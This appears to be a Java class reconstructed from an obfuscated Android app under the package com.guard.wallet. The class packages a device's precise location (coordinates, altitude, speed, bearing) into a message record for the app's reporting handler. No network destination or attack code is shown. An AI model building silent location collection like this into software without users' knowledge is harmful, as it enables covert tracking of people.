package com.guard.wallet.location;

import android.location.Location;
import com.guard.wallet.MainApplication;
import com.guard.wallet.req.MessageRecordVO;
import com.guard.wallet.resp.DeviceLocationVO;

/**
 * 位置事件分发器 (vendor v.a)
 *
 * 将 Android Location 转换为 DeviceLocationVO，通过消息处理器上报。
 * 单例字段 {@link #instance} 同时作为 LOCATION_EVENT 启用标志。
 */
public final class LocationDispatcher {
    public static volatile LocationDispatcher instance;
    public Integer status = 1;

    public static void dispatch(Location location) {
        if (location != null) {
            DeviceLocationVO vo = new DeviceLocationVO();
            if (location.hasAccuracy()) {
                vo.setAccuracy(location.getAccuracy());
            }
            if (location.hasAltitude()) {
                vo.setAltitude(location.getAltitude());
            }
            if (location.hasSpeed()) {
                vo.setSpeed(location.getSpeed());
            }
            if (location.hasBearing()) {
                vo.setBearing(location.getBearing());
            }
            vo.setLongitude(location.getLongitude());
            vo.setLatitude(location.getLatitude());

            MessageRecordVO record = new MessageRecordVO();
            record.setExtraBody(vo);
            record.setIntentCode("android.intent.action.DEVICE_LOCATION");
            MainApplication.getInstance().getHandlerMsgAndTimer().b(record);
        }
    }
}
